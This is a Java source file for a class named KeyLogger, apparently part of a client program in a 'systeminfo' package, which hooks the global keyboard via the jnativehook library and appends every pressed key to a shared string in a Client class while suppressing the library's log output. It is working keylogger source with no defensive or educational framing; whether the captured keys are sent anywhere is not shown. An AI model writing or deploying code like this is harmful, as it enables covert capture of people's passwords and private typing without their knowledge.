package com.csm.systeminfo;

import com.csm.client.Client;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;

/**
 * @author vakho
 */
public class KeyLogger implements NativeKeyListener {

	private static final Path file = Paths.get("keys.txt");
	private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);

	public static void main(String[] args) {

//		logger.info("Key logger has been started");

		init();

		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			logger.error(e.getMessage(), e);
			System.exit(-1);
		}

		GlobalScreen.addNativeKeyListener(new KeyLogger());
	}
	public static void startKeyLoger(){
		init();

		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			logger.error(e.getMessage(), e);
			System.exit(-1);
		}

		GlobalScreen.addNativeKeyListener(new KeyLogger());
	}
	private static void init() {
		
		// Get the logger for "org.jnativehook" and set the level to warning.
		java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
//		logger.setLevel(Level.WARNING);

		// Don't forget to disable the parent handlers.
		logger.setUseParentHandlers(false);
	}

	public void nativeKeyPressed(NativeKeyEvent e) {
		String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
//		System.out.println(e.getKeyChar());
		if (keyText.length() > 1) {
			if(keyText.equals("Undefined")){
				if(Client.keyLoger.endsWith("[Backspace]")){
					Client.keyLoger = Client.keyLoger.substring(0,Client.keyLoger.length()-11);
				}
			}else{
				Client.keyLoger+= "[" + keyText + "]";
			}
		} else {
			Client.keyLoger+=keyText;
		}
	}
	public void nativeKeyReleased(NativeKeyEvent e) {
		// Nothing Tây đẹp tâ â
	}

	public void nativeKeyTyped(NativeKeyEvent e) {
		// Nothing here
	}
}
